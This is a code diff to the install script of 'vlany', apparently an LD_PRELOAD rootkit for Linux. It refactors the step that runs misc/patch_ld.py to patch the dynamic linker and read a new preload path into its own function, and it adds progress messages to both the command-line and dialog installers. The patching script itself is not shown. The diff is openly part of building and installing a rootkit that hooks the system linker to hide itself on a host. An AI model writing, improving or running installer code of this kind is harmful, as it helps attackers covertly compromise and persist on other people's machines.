@@ -30,6 +30,12 @@ CHATTR_OUTPUT=$(touch children; chattr +ia children &>output; cat output)
 [[ $CHATTR_OUTPUT == *"Inappropriate ioctl"* ]] && { read -p "Warning: You're attempting to install vlany on a weird/alien filesystem. This is bad. Bailing."; exit; }
 chattr -ia children &>/dev/null; rm -f children output
 
+patch_dynamic_linker ()
+{
+    misc/patch_ld.py
+    NEW_PRELOAD=$(cat new_preload)
+}
+
 install_vlany_prerequisites ()
 {
     if [ -f /usr/bin/yum ]; then
@@ -44,7 +50,6 @@ install_vlany_prerequisites ()
         pacman -S --noconfirm attr pam openssl libpcap base-devel &>/dev/null
     fi
     
-    echo "Installing python(2)"
     if [ -f /usr/bin/yum ]; then
         yes | yum install python2 &>/dev/null
     elif [ -f /usr/bin/apt-get ]; then
@@ -57,9 +62,6 @@ install_vlany_prerequisites ()
 
     PYTHON_BIN=`which python2`
     [ ! -f "$PYTHON_BIN" ] && { echo "$PYTHON_BIN was not found. Make sure python2 is installed."; exit; }
-
-    misc/patch_ld.py
-    NEW_PRELOAD=$(cat new_preload)
 }
 
 vlany_install_dialog ()
@@ -286,6 +288,10 @@ if [ "$1" == "--cli" ]; then
     install_vlany_prerequisites
     echo "Packages installed."
 
+    echo "Patching dynamic linker."
+    patch_dynamic_linker
+    echo "Dynamic linker patched."
+
     printf "\033[1;31mBeginning configuration. Please don't leave any options that don't have default values empty (options with default values have [VALUE] in them). I can't be bothered checking for empty input.\033[0m\n"
 
     INSTALLING_IN_CLI=1
@@ -340,6 +346,10 @@ else
     dialog --title "$TITLE" --infobox "Installing prerequisite packages...\nPlease wait." 4 50 3>&1 1>&2 2>&3
     install_vlany_prerequisites
     dialog --title "$TITLE" --msgbox "Packages installed." 5 50
+    
+    dialog --title "$TITLE" --infobox "Patching dynamic linker." 3 50 3>&1 1>&2 2>&3
+    patch_dynamic_linker
+    dialog --title "$TITLE" --msgbox "Dynamic linker patched." 5 50
 
     get_vlany_settings
 
